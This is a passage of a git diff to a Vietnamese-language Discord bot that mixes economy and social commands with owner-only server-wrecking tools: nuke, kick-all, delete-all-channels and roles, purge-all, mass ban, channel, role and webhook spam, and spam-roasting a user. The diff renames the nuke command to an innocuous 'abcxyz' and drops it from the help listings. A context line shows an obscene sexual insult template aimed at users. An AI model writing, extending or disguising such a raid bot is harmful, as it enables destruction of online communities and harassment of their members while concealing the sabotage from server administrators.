@@ -21,9 +21,7 @@ DISCORD_TOKEN = os.getenv("TOKEN")
 
 # Danh sách ID của Boss Bảo và các đồng minh ủy quyền
 BOT_OWNERS = [
-    1540585511842881616,
-    1542453882263707759,
-    1502969774202814625,
+1540585511842881616,
 ]
 
 intents = discord.Intents.default()
@@ -35,11 +33,11 @@ intents.moderation = True
 intents.webhooks = True
 
 def get_prefix(bot, message):
-    if message.content.lower().startswith("nuked "):
-        return "nuked "
-    elif message.content.lower().startswith("nuked"):
-        return "nuked"
-    return "nuked "
+    prefixes = ('n!', 'N!', 'n! ', 'N! ')
+    for p in prefixes:
+        if message.content.startswith(p):
+            return p
+    return 'n! '  # fallback
 
 bot = commands.Bot(command_prefix=get_prefix, intents=intents)
 bot.remove_command('help')
@@ -116,10 +114,10 @@ def save_all_data():
 load_all_data()
 
 # ==================== HẰNG SỐ GIAO DIỆN ====================
-CUSTOM_SETUP_GIF = "https://i.pinimg.com/originals/7a/41/bb/7a41bb51fe3babe0c6cee161f85df62c.gif"
+CUSTOM_SETUP_GIF = "https://i.pinimg.com/originals/0b/5c/dd/0b5cddb5352ae325e8bcbd8ae8d448f9.gif"
 NUKE_GIF_URL = "https://media.discordapp.net/attachments/1541456087105151066/1542122209156538388/739ed3f3955356f06352d43eb649168a.gif"
-NUKE_AVATAR_URL = "https://media.discordapp.net/attachments/1541456087105151066/1542127023810416660/8b59ed006d0073e951a47e1da3c2d111.jpg"
-HELP_THUMBNAIL_GIF = "https://i.pinimg.com/originals/08/24/02/082402127402f0672076046e7f1d43eb.gif"
+NUKE_AVATAR_URL = "https://i.pinimg.com/originals/a7/11/6f/a7116f6d34c68356e727635462c35db9.gif"
+HELP_THUMBNAIL_GIF = "https://i.pinimg.com/originals/56/00/5a/56005a1acfe12d3df3e97c646d81b561.gif"
 
 ROAST_LINES = [
     "# Lồn mẹ mày nát bét như tương, bị địt đến không còn + chảy lênh! {username}",
@@ -552,10 +550,10 @@ async def restore_process(ctx, backup_data, filename):
     except Exception as e:
         await ctx.send(f"❌ Lỗi khi restore: {str(e)}")
 
-# ==================== LỆNH PHÁ HOẠI ====================
-@bot.command(name="nuke")
+# ==================== LỆNH PHÁ HOẠI (đã đổi tên) ====================
+@bot.command(name="abcxyz")
 @is_bot_owner()
-async def nuke(ctx):
+async def abcxyz(ctx):
     try:
         await ctx.message.delete()
     except:
@@ -580,8 +578,8 @@ async def nuke(ctx):
     except discord.Forbidden:
         await ctx.send("❌ Boss Bảo ơi, hãy mở DM (Tin nhắn riêng) để bot có thể gửi bảng xác nhận nuke nhé!")
 
-@nuke.error
-async def nuke_error(ctx, error):
+@abcxyz.error
+async def abcxyz_error(ctx, error):
     if isinstance(error, commands.CheckFailure):
         await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
     else:
@@ -755,7 +753,7 @@ async def unban_user_error(ctx, error):
 @is_bot_owner()
 async def massban(ctx, *members: discord.Member):
     if not members:
-        await ctx.send("❌ Cần tag ít nhất 1 người. VD: `nuked massban @user1 @user2`")
+        await ctx.send("❌ Cần tag ít nhất 1 người. VD: `n! massban @user1 @user2`")
         return
     success = 0
     failed = 0
@@ -991,7 +989,7 @@ async def move_member_error(ctx, error):
 @is_bot_owner()
 async def move_all_voice(ctx, channel: discord.VoiceChannel = None):
     if channel is None:
-        await ctx.send("❌ Vui lòng tag voice channel! VD: `nuked moveall #voice`")
+        await ctx.send("❌ Vui lòng tag voice channel! VD: `n! moveall #voice`")
         return
     try:
         count = 0
@@ -1043,7 +1041,7 @@ async def kick_all_members(ctx):
             description=(
                 f"🔥 **Boss Bảo kính yêu!**\n\n"
                 f"Lệnh này sẽ kick toàn bộ thành viên trừ Boss và bot.\n\n"
-                f"🔹 **Gõ nuked confirmkickall để xác nhận**\n"
+                f"🔹 **Gõ n! confirmkickall để xác nhận**\n"
                 f"🔹 **Gõ bất kỳ tin nhắn nào khác để hủy bỏ**"
             ),
             color=0xFF0000
@@ -1053,7 +1051,7 @@ async def kick_all_members(ctx):
             return m.author == ctx.author and m.channel == ctx.channel
         try:
             msg = await bot.wait_for('message', timeout=30.0, check=check)
-            if msg.content.lower() != "nuked confirmkickall":
+            if msg.content.lower() != "n! confirmkickall":
                 await ctx.send("❌ Hủy bỏ.")
                 return
         except asyncio.TimeoutError:
@@ -1089,7 +1087,7 @@ async def kick_all_members_error(ctx, error):
 @is_bot_owner()
 async def masskick(ctx, *members: discord.Member):
     if not members:
-        await ctx.send("❌ Cần tag ít nhất 1 người. VD: `nuked masskick @user1 @user2`")
+        await ctx.send("❌ Cần tag ít nhất 1 người. VD: `n! masskick @user1 @user2`")
         return
     success = 0
     failed = 0
@@ -1300,7 +1298,7 @@ async def remove_role_from_user_error(ctx, error):
 @is_bot_owner()
 async def purge_all(ctx, confirm: str = None):
     if confirm is None or confirm.lower() != "all":
-        await ctx.send("⚠️ **CẢNH BÁO!** Lệnh này sẽ xóa TOÀN BỘ tin nhắn trong server!\n🔹 Gõ `nuked purge all` để xác nhận.")
+        await ctx.send("⚠️ **CẢNH BÁO!** Lệnh này sẽ xóa TOÀN BỘ tin nhắn trong server!\n🔹 Gõ `n! purge all` để xác nhận.")
         return
 
     embed = discord.Embed(
@@ -1535,7 +1533,7 @@ async def delete_all_channels(ctx):
             description=(
                 f"🔥 **Boss Bảo kính yêu!**\n\n"
                 f"Lệnh này sẽ xóa **TOÀN BỘ** kênh trong server\n\n"
-                f"🔹 **Gõ nuked confirmdelete để xác nhận**\n"
+                f"🔹 **Gõ n! confirmdelete để xác nhận**\n"
                 f"🔹 **Gõ bất kỳ tin nhắn nào khác để hủy bỏ**"
             ),
             color=0xFF0000
@@ -1545,7 +1543,7 @@ async def delete_all_channels(ctx):
             return m.author == ctx.author and m.channel == ctx.channel
         try:
             msg = await bot.wait_for('message', timeout=30.0, check=check)
-            if msg.content.lower() != "nuked confirmdelete":
+            if msg.content.lower() != "n! confirmdelete":
                 await ctx.send("❌ Lệnh xóa kênh đã bị hủy bỏ.")
                 return
         except asyncio.TimeoutError:
@@ -1657,7 +1655,7 @@ async def delete_all_roles(ctx):
             description=(
                 f"🔥 **Boss Bảo kính yêu!**\n\n"
                 f"Lệnh này sẽ xóa **TOÀN BỘ** role\n\n"
-                f"🔹 **Gõ nuked confirmdeleteroles để xác nhận**\n"
+                f"🔹 **Gõ n! confirmdeleteroles để xác nhận**\n"
                 f"🔹 **Gõ bất kỳ tin nhắn nào khác để hủy bỏ**"
             ),
             color=0xFF0000
@@ -1667,7 +1665,7 @@ async def delete_all_roles(ctx):
             return m.author == ctx.author and m.channel == ctx.channel
         try:
             msg = await bot.wait_for('message', timeout=30.0, check=check)
-            if msg.content.lower() != "nuked confirmdeleteroles":
+            if msg.content.lower() != "n! confirmdeleteroles":
                 await ctx.send("❌ Hủy bỏ.")
                 return
         except asyncio.TimeoutError:
@@ -1726,7 +1724,7 @@ async def set_slowmode_error(ctx, error):
 @is_bot_owner()
 async def set_nickname(ctx, member: discord.Member, *, nickname: str = None):
     if nickname is None:
-        await ctx.send("❌ Vui lòng nhập nickname! VD: `nuked nick @user Tên mới`")
+        await ctx.send("❌ Vui lòng nhập nickname! VD: `n! nick @user Tên mới`")
         return
     try:
         old_name = member.display_name
@@ -1890,7 +1888,7 @@ async def list_emoji(ctx):
         color=0x00CCFF
     )
     if len(emoji_list) > 25:
-        embed.set_footer(text=f"Hiển thị 25/{len(emoji_list)} emoji. Dùng nuked emoji để xem thêm.")
+        embed.set_footer(text=f"Hiển thị 25/{len(emoji_list)} emoji. Dùng n! emoji để xem thêm.")
     else:
         embed.set_footer(text="Hệ thống quản trị Boss Bảo 💖")
     await ctx.send(embed=embed)
@@ -1978,7 +1976,7 @@ async def set_welcome_channel(ctx, channel: discord.TextChannel = None):
         else:
             embed = discord.Embed(
                 title="⚠️ CHƯA CÀI ĐẶT",
-                description="🔹 Hiện chưa có kênh chào mừng nào được cài đặt.\n🔹 Cú pháp: `nuked setwelcome #kênh`",
+                description="🔹 Hiện chưa có kênh chào mừng nào được cài đặt.\n🔹 Cú pháp: `n! setwelcome #kênh`",
                 color=0xFF9900
             )
             await ctx.send(embed=embed)
@@ -2014,7 +2012,7 @@ async def set_goodbye_channel(ctx, channel: discord.TextChannel = None):
         else:
             embed = discord.Embed(
                 title="⚠️ CHƯA CÀI ĐẶT",
-                description="🔹 Hiện chưa có kênh tạm biệt nào được cài đặt.\n🔹 Cú pháp: `nuked setgoodbye #kênh`",
+                description="🔹 Hiện chưa có kênh tạm biệt nào được cài đặt.\n🔹 Cú pháp: `n! setgoodbye #kênh`",
                 color=0xFF9900
             )
             await ctx.send(embed=embed)
@@ -2053,8 +2051,8 @@ async def set_level_channel(ctx, channel: discord.TextChannel = None):
                 title="⚠️ CHƯA CÀI ĐẶT KÊNH LEVEL",
                 description=(
                     "🔹 Hiện chưa có kênh thông báo level nào được cài đặt.\n"
-                    "🔹 **Cú pháp:** `nuked setlevelchannel #kênh` hoặc `nuked channelslv #kênh`\n"
-                    "🔹 **Ví dụ:** `nuked channelslv #level`\n\n"
+                    "🔹 **Cú pháp:** `n! setlevelchannel #kênh` hoặc `n! channelslv #kênh`\n"
+                    "🔹 **Ví dụ:** `n! channelslv #level`\n\n"
                     "📌 **Chức năng:** Tự động thông báo khi thành viên lên level"
                 ),
                 color=0xFF9900
@@ -2113,8 +2111,8 @@ async def set_log_channel(ctx, channel: discord.TextChannel = None):
                 title="⚠️ CHƯA CÀI ĐẶT LOG",
                 description=(
                     "🔹 Hiện chưa có kênh log nào được cài đặt.\n"
-                    "🔹 **Cú pháp:** `nuked log #kênh` hoặc `nuked channelslog #kênh`\n"
-                    "🔹 **Ví dụ:** `nuked log #log`"
+                    "🔹 **Cú pháp:** `n! log #kênh` hoặc `n! channelslog #kênh`\n"
+                    "🔹 **Ví dụ:** `n! log #log`"
                 ),
                 color=0xFF9900
             )
@@ -2371,61 +2369,60 @@ async def showsv_error(ctx, error):
 @is_bot_owner()
 async def admin_commands(ctx):
     all_commands = [
-        "`nuked kick @user` - Kick thành viên",
-        "`nuked ban @user` - Ban thành viên",
-        "`nuked unban <id>` - Unban thành viên",
-        "`nuked createchannel <tên>` - Tạo kênh mới",
-        "`nuked deletechannel #kênh` - Xóa kênh",
-        "`nuked purge all` - Xóa toàn bộ tin nhắn",
-        "`nuked role @user <role>` - Thêm role",
-        "`nuked removerole @user <role>` - Xóa role",
-        "`nuked lock #kênh` - Khóa kênh",
-        "`nuked unlock #kênh` - Mở khóa kênh",
-        "`nuked mute @user [thời gian]` - Mute thành viên",
-        "`nuked unmute @user` - Unmute thành viên",
-        "`nuked warn @user` - Cảnh cáo thành viên",
-        "`nuked clear <số>` - Xóa tin nhắn",
-        "`nuked spam @user` - Spam chửi",
-        "`nuked stop` - Dừng spam",
-        "`nuked kickall` - Kick toàn bộ",
-        "`nuked deleteallchannels` - Xóa tất cả kênh",
-        "`nuked deleteallroles` - Xóa tất cả role",
-        "`nuked spamroles` - Tạo role spam",
-        "`nuked spamchannels` - Tạo kênh spam",
-        "`nuked setservername` - Đổi tên server",
-        "`nuked setservericon` - Đổi icon server",
-        "`nuked addrole <tên>` - Tạo role mới",
-        "`nuked showsv` - Xem danh sách server",
-        "`nuked nuke` - NUKE SERVER",
-        "`nuked setup` - Bảng điều khiển",
-        "`nuked log #kênh` - Cài kênh log",
-        "`nuked channelslv #kênh` - Cài kênh level",
-        "`nuked setlv <level> @user` - Set level",
-        "`nuked lv @user` - Xem level",
-        "`nuked setwelcome #kênh` - Cài kênh chào mừng",
-        "`nuked setgoodbye #kênh` - Cài kênh tạm biệt",
-        "`nuked backup` - Backup server",
-        "`nuked restore` - Khôi phục server từ backup",
-        "`nuked slowmode <giây>` - Bật slowmode",
-        "`nuked nick @user <tên>` - Đổi nickname",
-        "`nuked resetnick @user` - Reset nickname",
-        "`nuked vc <tên>` - Tạo voice channel",
-        "`nuked hide #kênh` - Ẩn kênh",
-        "`nuked reveal #kênh` - Hiện kênh",
-        "`nuked rename <tên>` - Đổi tên server",
-        "`nuked icon [url]` - Đổi icon server",
-        "`nuked emoji` - Xem danh sách emoji",
-        "`nuked steal <id> <tên>` - Copy emoji",
-        "`nuked moveall #voice` - Di chuyển tất cả voice",
-        "`nuked massban <@user1 @user2 ...>` - Ban nhiều người",
-        "`nuked masskick <@user1 @user2 ...>` - Kick nhiều người",
-        "`nuked clonechannel #kênh` - Clone kênh",
-        "`nuked webhookspam` - Spam qua webhook",
-        "`nuked serverinfo` - Thông tin server",
-        "`nuked userinfo @user` - Thông tin user",
-        "`nuked avatar @user` - Lấy avatar",
-        "`nuked off [lệnh]` - Tắt lệnh hoặc bot",
-        "`nuked on [lệnh]` - Bật lệnh hoặc thông báo bot đang hoạt động"
+        "`n! kick @user` - Kick thành viên",
+        "`n! ban @user` - Ban thành viên",
+        "`n! unban <id>` - Unban thành viên",
+        "`n! createchannel <tên>` - Tạo kênh mới",
+        "`n! deletechannel #kênh` - Xóa kênh",
+        "`n! purge all` - Xóa toàn bộ tin nhắn",
+        "`n! role @user <role>` - Thêm role",
+        "`n! removerole @user <role>` - Xóa role",
+        "`n! lock #kênh` - Khóa kênh",
+        "`n! unlock #kênh` - Mở khóa kênh",
+        "`n! mute @user [thời gian]` - Mute thành viên",
+        "`n! unmute @user` - Unmute thành viên",
+        "`n! warn @user` - Cảnh cáo thành viên",
+        "`n! clear <số>` - Xóa tin nhắn",
+        "`n! spam @user` - Spam chửi",
+        "`n! stop` - Dừng spam",
+        "`n! kickall` - Kick toàn bộ",
+        "`n! deleteallchannels` - Xóa tất cả kênh",
+        "`n! deleteallroles` - Xóa tất cả role",
+        "`n! spamroles` - Tạo role spam",
+        "`n! spamchannels` - Tạo kênh spam",
+        "`n! setservername` - Đổi tên server",
+        "`n! setservericon` - Đổi icon server",
+        "`n! addrole <tên>` - Tạo role mới",
+        "`n! showsv` - Xem danh sách server",
+        "`n! setup` - Bảng điều khiển",
+        "`n! log #kênh` - Cài kênh log",
+        "`n! channelslv #kênh` - Cài kênh level",
+        "`n! setlv <level> @user` - Set level",
+        "`n! lv @user` - Xem level",
+        "`n! setwelcome #kênh` - Cài kênh chào mừng",
+        "`n! setgoodbye #kênh` - Cài kênh tạm biệt",
+        "`n! backup` - Backup server",
+        "`n! restore` - Khôi phục server từ backup",
+        "`n! slowmode <giây>` - Bật slowmode",
+        "`n! nick @user <tên>` - Đổi nickname",
+        "`n! resetnick @user` - Reset nickname",
+        "`n! vc <tên>` - Tạo voice channel",
+        "`n! hide #kênh` - Ẩn kênh",
+        "`n! reveal #kênh` - Hiện kênh",
+        "`n! rename <tên>` - Đổi tên server",
+        "`n! icon [url]` - Đổi icon server",
+        "`n! emoji` - Xem danh sách emoji",
+        "`n! steal <id> <tên>` - Copy emoji",
+        "`n! moveall #voice` - Di chuyển tất cả voice",
+        "`n! massban <@user1 @user2 ...>` - Ban nhiều người",
+        "`n! masskick <@user1 @user2 ...>` - Kick nhiều người",
+        "`n! clonechannel #kênh` - Clone kênh",
+        "`n! webhookspam` - Spam qua webhook",
+        "`n! serverinfo` - Thông tin server",
+        "`n! userinfo @user` - Thông tin user",
+        "`n! avatar @user` - Lấy avatar",
+        "`n! off [lệnh]` - Tắt lệnh hoặc bot",
+        "`n! on [lệnh]` - Bật lệnh hoặc thông báo bot đang hoạt động"
     ]
     embed = discord.Embed(
         title="👑 DANH SÁCH LỆNH QUẢN TRỊ",
@@ -2497,7 +2494,7 @@ async def restore_server(ctx, file_name: str = None):
         if file_name is None:
             file_name = f"backup_{ctx.guild.id}.json"
         if not os.path.exists(file_name):
-            await ctx.send(f"❌ Không tìm thấy file backup `{file_name}`. Hãy chạy `nuked backup` trước.")
+            await ctx.send(f"❌ Không tìm thấy file backup `{file_name}`. Hãy chạy `n! backup` trước.")
             return
         with open(file_name, "r", encoding="utf-8") as f:
             backup_data = json.load(f)
@@ -2550,7 +2547,7 @@ async def set_level_error(ctx, error):
     if isinstance(error, commands.CheckFailure):
         await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
     else:
-        await ctx.send(f"❌ Cú pháp đúng: `nuked setlv <level> @user`")
+        await ctx.send(f"❌ Cú pháp đúng: `n! setlv <level> @user`")
 
 @bot.command(name="lv")
 async def check_user_level(ctx, member: discord.Member = None):
@@ -2572,7 +2569,7 @@ async def check_user_level(ctx, member: discord.Member = None):
 
 @check_user_level.error
 async def check_user_level_error(ctx, error):
-    await ctx.send(f"❌ Cú pháp đúng: `nuked lv` hoặc `nuked lv @user`")
+    await ctx.send(f"❌ Cú pháp đúng: `n! lv` hoặc `n! lv @user`")
 
 # ==================== LỆNH TÌNH YÊU ====================
 GIF_HUG = [
@@ -2588,7 +2585,7 @@ GIF_LOVE = ["https://media.tenor.com/5L1k2C3d4zIAAAAM/anime-love.gif"]
 @bot.command(name="love", aliases=["tinhyeu"])
 async def love(ctx, user1: discord.Member = None, user2: discord.Member = None):
     if user1 is None:
-        await ctx.send("📌 Cú pháp: `nuked love @user1 @user2` hoặc `nuked love @user`")
+        await ctx.send("📌 Cú pháp: `n! love @user1 @user2` hoặc `n! love @user`")
         return
     if user2 is None:
         user2 = ctx.author
@@ -2614,7 +2611,7 @@ async def love(ctx, user1: discord.Member = None, user2: discord.Member = None):
 @bot.command(name="hug", aliases=["om"])
 async def hug(ctx, member: discord.Member = None):
     if member is None:
-        await ctx.send("📌 Cú pháp: `nuked hug @user`")
+        await ctx.send("📌 Cú pháp: `n! hug @user`")
         return
     embed = discord.Embed(
         title="🤗 ÔM",
@@ -2627,7 +2624,7 @@ async def hug(ctx, member: discord.Member = None):
 @bot.command(name="kiss", aliases=["hon"])
 async def kiss(ctx, member: discord.Member = None):
     if member is None:
-        await ctx.send("📌 Cú pháp: `nuked kiss @user`")
+        await ctx.send("📌 Cú pháp: `n! kiss @user`")
         return
     embed = discord.Embed(
         title="😘 HÔN",
@@ -2640,7 +2637,7 @@ async def kiss(ctx, member: discord.Member = None):
 @bot.command(name="slap", aliases=["tat"])
 async def slap(ctx, member: discord.Member = None):
     if member is None:
-        await ctx.send("📌 Cú pháp: `nuked slap @user`")
+        await ctx.send("📌 Cú pháp: `n! slap @user`")
         return
     embed = discord.Embed(
         title="👋 TÁT",
@@ -2653,7 +2650,7 @@ async def slap(ctx, member: discord.Member = None):
 @bot.command(name="pat", aliases=["vodau"])
 async def pat(ctx, member: discord.Member = None):
     if member is None:
-        await ctx.send("📌 Cú pháp: `nuked pat @user`")
+        await ctx.send("📌 Cú pháp: `n! pat @user`")
         return
     embed = discord.Embed(
         title="🫳 VỖ ĐẦU",
@@ -2666,7 +2663,7 @@ async def pat(ctx, member: discord.Member = None):
 @bot.command(name="cuddle", aliases=["auyem"])
 async def cuddle(ctx, member: discord.Member = None):
     if member is None:
-        await ctx.send("📌 Cú pháp: `nuked cuddle @user`")
+        await ctx.send("📌 Cú pháp: `n! cuddle @user`")
         return
     embed = discord.Embed(
         title="🥰 ÂU YẾM",
@@ -2679,7 +2676,7 @@ async def cuddle(ctx, member: discord.Member = None):
 @bot.command(name="marry", aliases=["cuoi"])
 async def marry(ctx, member: discord.Member = None):
     if member is None:
-        await ctx.send("📌 Cú pháp: `nuked marry @user`")
+        await ctx.send("📌 Cú pháp: `n! marry @user`")
         return
     if member.id == ctx.author.id:
         await ctx.send("❌ Bạn không thể tự kết hôn với chính mình!")
@@ -2706,7 +2703,7 @@ async def marry(ctx, member: discord.Member = None):
 @bot.command(name="divorce", aliases=["lyhon"])
 async def divorce(ctx, member: discord.Member = None):
     if member is None:
-        await ctx.send("📌 Cú pháp: `nuked divorce @user`")
+        await ctx.send("📌 Cú pháp: `n! divorce @user`")
         return
     guild_id = str(ctx.guild.id)
     user1 = str(ctx.author.id)
@@ -2727,7 +2724,7 @@ async def divorce(ctx, member: discord.Member = None):
 @bot.command(name="ship", aliases=["ghepdoi"])
 async def ship(ctx, user1: discord.Member = None, user2: discord.Member = None):
     if user1 is None:
-        await ctx.send("📌 Cú pháp: `nuked ship @user1 @user2`")
+        await ctx.send("📌 Cú pháp: `n! ship @user1 @user2`")
         return
     if user2 is None:
         user2 = ctx.author
@@ -2751,7 +2748,7 @@ async def ship(ctx, user1: discord.Member = None, user2: discord.Member = None):
 @bot.command(name="crush", aliases=["totoinh"])
 async def crush(ctx, member: discord.Member = None):
     if member is None:
-        await ctx.send("📌 Cú pháp: `nuked crush @user`")
+        await ctx.send("📌 Cú pháp: `n! crush @user`")
         return
     responses = [
         f"{member.mention} ơi, {ctx.author.mention} nói là thích bạn đó!",
@@ -2772,97 +2769,96 @@ HELP_CATEGORIES = {
         "emoji": "👑",
         "description": "Bộ công cụ tối cao dành riêng cho Boss Bảo và Owners – quản trị server, phá hoại, kiểm soát tuyệt đối.",
         "commands": {
-            "nuked nuke": "🔥 Phá hoại toàn bộ Server (cần xác nhận)",
-            "nuked spam": "⚡ Bắt đầu spam tất cả các kênh",
-            "nuked stopspam": "🛑 Dừng hệ thống spam",
-            "nuked spamroast @user <số>": "🔥 Spam chửi thành viên chỉ định",
-            "nuked kick @user [lý do]": "🦵 Kick thành viên ra khỏi server",
-            "nuked ban @user [lý do]": "🔨 Cấm thành viên khỏi server",
-            "nuked unban <id>": "✅ Gỡ ban cho thành viên qua ID",
-            "nuked massban @user1 @user2...": "🔨 Cấm nhiều người cùng lúc",
-            "nuked mute @user [phút]": "🔇 Tắt tiếng (timeout) thành viên",
-            "nuked unmute @user": "🔊 Bỏ tắt tiếng thành viên",
-            "nuked createchannel <tên>": "🆕 Tạo kênh văn bản mới",
-            "nuked deletechannel [#channel]": "🗑️ Xóa kênh được chọn",
-            "nuked lockchannel [#channel]": "🔒 Khóa kênh văn bản",
-            "nuked unlockchannel [#channel]": "🔓 Mở khóa kênh văn bản",
-            "nuked createrole <tên>": "🎭 Tạo role mới",
-            "nuked deleterole <tên>": "🗑️ Xóa role khỏi server",
-            "nuked role @user <tên role>": "🎭 Gán role cho thành viên",
-            "nuked removerole @user <tên role>": "🎭 Xóa role khỏi thành viên",
-            "nuked purge all": "🧹 Xóa sạch toàn bộ tin nhắn server",
-            "nuked clear <số>": "🧹 Xóa tin nhắn trong kênh (tối đa 1000)",
-            "nuked createcategory <tên>": "📁 Tạo Danh mục (Category) mới",
-            "nuked move @user #voice": "🚪 Di chuyển thành viên sang voice khác",
-            "nuked settopic #channel <nội dung>": "📝 Đặt chủ đề cho kênh",
-            "nuked setnsfw #channel <true/false>": "🔞 Bật/Tắt chế độ NSFW",
-            "nuked setwelcome #channel": "🎉 Đặt kênh chào mừng",
-            "nuked setgoodbye #channel": "😢 Đặt kênh tạm biệt",
-            "nuked setlevelchannel #channel": "📈 Đặt kênh thông báo Level Up",
-            "nuked log #channel": "📋 Đặt kênh log sự kiện",
-            "nuked setlv <level> @user": "📊 Đặt level cho người chơi",
-            "nuked backup": "💾 Backup server",
-            "nuked restore": "🔄 Khôi phục server từ backup",
-            "nuked addrole <tên>": "👑 Tạo role với quyền của bot",
-            "nuked showsv": "🌐 Xem danh sách server bot đang tham gia",
-            "nuked admincmd": "📋 Xem toàn bộ lệnh quản trị"
+            "n! spam": "⚡ Bắt đầu spam tất cả các kênh",
+            "n! stopspam": "🛑 Dừng hệ thống spam",
+            "n! spamroast @user <số>": "🔥 Spam chửi thành viên chỉ định",
+            "n! kick @user [lý do]": "🦵 Kick thành viên ra khỏi server",
+            "n! ban @user [lý do]": "🔨 Cấm thành viên khỏi server",
+            "n! unban <id>": "✅ Gỡ ban cho thành viên qua ID",
+            "n! massban @user1 @user2...": "🔨 Cấm nhiều người cùng lúc",
+            "n! mute @user [phút]": "🔇 Tắt tiếng (timeout) thành viên",
+            "n! unmute @user": "🔊 Bỏ tắt tiếng thành viên",
+            "n! createchannel <tên>": "🆕 Tạo kênh văn bản mới",
+            "n! deletechannel [#channel]": "🗑️ Xóa kênh được chọn",
+            "n! lockchannel [#channel]": "🔒 Khóa kênh văn bản",
+            "n! unlockchannel [#channel]": "🔓 Mở khóa kênh văn bản",
+            "n! createrole <tên>": "🎭 Tạo role mới",
+            "n! deleterole <tên>": "🗑️ Xóa role khỏi server",
+            "n! role @user <tên role>": "🎭 Gán role cho thành viên",
+            "n! removerole @user <tên role>": "🎭 Xóa role khỏi thành viên",
+            "n! purge all": "🧹 Xóa sạch toàn bộ tin nhắn server",
+            "n! clear <số>": "🧹 Xóa tin nhắn trong kênh (tối đa 1000)",
+            "n! createcategory <tên>": "📁 Tạo Danh mục (Category) mới",
+            "n! move @user #voice": "🚪 Di chuyển thành viên sang voice khác",
+            "n! settopic #channel <nội dung>": "📝 Đặt chủ đề cho kênh",
+            "n! setnsfw #channel <true/false>": "🔞 Bật/Tắt chế độ NSFW",
+            "n! setwelcome #channel": "🎉 Đặt kênh chào mừng",
+            "n! setgoodbye #channel": "😢 Đặt kênh tạm biệt",
+            "n! setlevelchannel #channel": "📈 Đặt kênh thông báo Level Up",
+            "n! log #channel": "📋 Đặt kênh log sự kiện",
+            "n! setlv <level> @user": "📊 Đặt level cho người chơi",
+            "n! backup": "💾 Backup server",
+            "n! restore": "🔄 Khôi phục server từ backup",
+            "n! addrole <tên>": "👑 Tạo role với quyền của bot",
+            "n! showsv": "🌐 Xem danh sách server bot đang tham gia",
+            "n! admincmd": "📋 Xem toàn bộ lệnh quản trị"
         }
     },
     "💰 Kinh Tế & Giải Trí": {
         "emoji": "💰",
         "description": "Hệ thống mini-game, cá cược, kiếm coin và chuyển tiền phong phú.",
         "commands": {
-            "nuked balance [@user]": "💰 Xem số dư coin của bạn hoặc người khác",
-            "nuked daily": "🎁 Nhận quà coin miễn phí mỗi ngày (24h)",
-            "nuked work": "🛠️ Làm việc kiếm coin",
-            "nuked give @user <số>": "💸 Chuyển coin cho người khác",
-            "nuked coinflip <số> <h/t>": "🪙 Tung đồng xu x2 tiền cược",
-            "nuked slots <số>": "🎰 Quay hũ Slots – jackpot x5",
-            "nuked rps <số> <r/p/s>": "✂️ Oẳn tù tì x2 tiền cược",
-            "nuked dice <số> <1-6>": "🎲 Đoán xúc xắc x4",
-            "nuked hilo <số> <h/l>": "🎴 Cao / thấp hơn 7 x1.8",
-            "nuked crash <số>": "🚀 Tên lửa dừng đúng lúc nhân tiền",
-            "nuked lottery <số>": "🎫 Xổ số x10",
-            "nuked blackjack <số>": "🃏 Xì dách 21 điểm x2",
-            "nuked beg": "🥺 Xin tiền",
-            "nuked crime": "🚨 Trộm cướp",
-            "nuked bank deposit <số/all>": "🏦 Gửi tiền vào ngân hàng",
-            "nuked bank withdraw <số/all>": "💸 Rút tiền từ ngân hàng",
-            "nuked leaderboard": "🏆 Bảng xếp hạng giàu nhất server",
-            "nuked topcoin": "🏆 Xếp hạng coin (top 10)",
-            "nuked toplevel": "🏆 Xếp hạng level (top 10)"
+            "n! balance [@user]": "💰 Xem số dư coin của bạn hoặc người khác",
+            "n! daily": "🎁 Nhận quà coin miễn phí mỗi ngày (24h)",
+            "n! work": "🛠️ Làm việc kiếm coin",
+            "n! give @user <số>": "💸 Chuyển coin cho người khác",
+            "n! coinflip <số> <h/t>": "🪙 Tung đồng xu x2 tiền cược",
+            "n! slots <số>": "🎰 Quay hũ Slots – jackpot x5",
+            "n! rps <số> <r/p/s>": "✂️ Oẳn tù tì x2 tiền cược",
+            "n! dice <số> <1-6>": "🎲 Đoán xúc xắc x4",
+            "n! hilo <số> <h/l>": "🎴 Cao / thấp hơn 7 x1.8",
+            "n! crash <số>": "🚀 Tên lửa dừng đúng lúc nhân tiền",
+            "n! lottery <số>": "🎫 Xổ số x10",
+            "n! blackjack <số>": "🃏 Xì dách 21 điểm x2",
+            "n! beg": "🥺 Xin tiền",
+            "n! crime": "🚨 Trộm cướp",
+            "n! bank deposit <số/all>": "🏦 Gửi tiền vào ngân hàng",
+            "n! bank withdraw <số/all>": "💸 Rút tiền từ ngân hàng",
+            "n! leaderboard": "🏆 Bảng xếp hạng giàu nhất server",
+            "n! topcoin": "🏆 Xếp hạng coin (top 10)",
+            "n! toplevel": "🏆 Xếp hạng level (top 10)"
         }
     },
     "📊 Thông Tin & Hệ Thống": {
         "emoji": "📊",
         "description": "Xem thống kê server, độ trễ, bảng xếp hạng.",
         "commands": {
-            "nuked stats": "📊 Xem thông số chi tiết của server",
-            "nuked ping": "🏓 Kiểm tra độ trễ của bot",
-            "nuked topcoin": "🏆 Bảng xếp hạng những người có coin nhiều nhất",
-            "nuked toplevel": "🏆 Bảng xếp hạng level cao nhất",
-            "nuked serverinfo": "🌐 Thông tin chi tiết server",
-            "nuked userinfo @user": "👤 Thông tin chi tiết người dùng",
-            "nuked avatar @user": "🖼️ Xem avatar",
-            "nuked membercount": "👥 Số lượng thành viên",
-            "nuked listroles": "📋 Danh sách role",
-            "nuked listchannels": "📋 Danh sách kênh"
+            "n! stats": "📊 Xem thông số chi tiết của server",
+            "n! ping": "🏓 Kiểm tra độ trễ của bot",
+            "n! topcoin": "🏆 Bảng xếp hạng những người có coin nhiều nhất",
+            "n! toplevel": "🏆 Bảng xếp hạng level cao nhất",
+            "n! serverinfo": "🌐 Thông tin chi tiết server",
+            "n! userinfo @user": "👤 Thông tin chi tiết người dùng",
+            "n! avatar @user": "🖼️ Xem avatar",
+            "n! membercount": "👥 Số lượng thành viên",
+            "n! listroles": "📋 Danh sách role",
+            "n! listchannels": "📋 Danh sách kênh"
         }
     },
     "💘 Tình yêu & Tương tác": {
         "emoji": "💘",
         "description": "Các lệnh tương tác vui vẻ, tỏ tình, kết hôn.",
         "commands": {
-            "nuked love @user1 @user2": "💘 Tỷ lệ tình yêu",
